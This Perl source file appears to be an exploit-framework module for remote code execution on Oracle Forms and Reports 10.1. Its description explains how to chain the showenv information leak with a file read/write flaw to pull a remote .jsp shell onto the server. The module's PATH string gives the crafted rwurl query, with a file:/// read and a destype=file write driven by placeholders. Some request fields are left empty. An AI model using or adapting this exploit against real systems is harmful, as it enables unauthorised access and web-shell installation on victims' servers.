package ORACLE::MSF::OracleReportsRce;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "OracleReportsRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

      This module uses two vulnerabilities in Oracle Forms and Reports to get remote code execution

      on the host. The showenv url can be used to disclose information about a server. A second

      vulnerability that allows arbitrary reading and writing to the host filesystem can then be

      used to write a shell from a remote url to a known local path disclosed from the previous

      vulnerability.



      The local path being accessible from an URL allows an attacker to perform the remote code

      execution using, for example, a .jsp shell.



      This module was tested successfully on Windows and Oracle Forms and Reports 10.1.

      ",
  JOBTYPE => "rwurl",
  METHOD => "",
  MSF_MODULE => "oracle_reports_rce",
  PATH => "report=test.rdf&desformat=html&destype=cache&JOBTYPE=rwurl&URLPARAMETER=file:///&report=test.rdf&desformat=html&destype=file&desname=__DESNAME__&JOBTYPE=rwurl&URLPARAMETER=__URLPARAMETER__&",
  REFERENCES => ["file:///"],
  TITLE => "Oracle Forms and Reports Remote Code Execution",
  VARIABLES => {
    'DESNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'URLPARAMETER' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
